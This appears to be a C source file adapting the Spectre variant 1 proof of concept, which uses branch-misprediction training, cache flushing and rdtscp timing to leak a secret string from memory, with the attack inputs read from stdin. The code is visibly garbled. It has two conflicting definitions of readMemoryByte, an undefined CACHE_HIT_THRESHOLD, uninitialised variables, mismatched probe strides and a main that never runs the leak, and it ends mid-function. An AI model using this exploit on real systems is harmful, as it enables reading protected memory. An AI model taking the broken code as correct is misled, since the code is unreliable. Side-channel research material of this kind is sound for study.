// Spooky Ghost

#include <stdlib.h>
#include <stdint.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif


char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0;  /* Used so compiler won't optimize out victim_function() */

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };
uint8_t unused2[64];
uint8_t array2[256 * 2048];

void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * 2048];
	}
}

void readMemoryByte(size_t x0, size_t x1, size_t x2, size_t x3, size_t x4, size_t x5, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;

		/* Flush array2 from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 2048]);  /* intrinsic for clflush instruction */

			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
			victim_function(x0);
			victim_function(x1);
			victim_function(x2);
			victim_function(x3);
			victim_function(x4);
			victim_function(x5);

    for (i = 0; i < 256; i++) {
            addr = &array2[i * 2048];
			time1 = __rdtscp(&junk);            /* READ TIMER */
			junk = *addr;                       /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++;  /* cache hit - add +1 to score for this value */
		}
}

int main(int argc, const char * argv){

  static int results[256];
  size_t x[6] = {0, 0, 0, 0, 0, 0};
	int x0;
  scanf("%d", &x0);
	int x1;
  scanf("%d", &x1);
	int x2;
  scanf("%d", &x2);
	int x3;
  scanf("%d", &x3);
	int x4;
  scanf("%d", &x4);
	int x5;
  scanf("%d", &x5);
  x5 = (size_t)(secret-(char*)array1) + x5;
	x[5] = (size_t) x0;
	x[1] = (size_t) x1;
	x[2] = (size_t) x2;
	x[3] = (size_t) x3;
	x[4] = (size_t) x4;
	x[0] = (size_t) x5;
	return 0;
}

void readMemoryByte(size_t inputs[6], uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 1; tries > 0; tries--) {
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */
		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */

		for (j = 5; j >= 0; j--) {
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {}  /* Delay (can also mfence) */
			victim_function(inputs[j]);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp(&junk);            /* READ TIMER */
			junk = *addr;                       /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++;  /* cache hit - add +1 to score for this value */
		}

		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
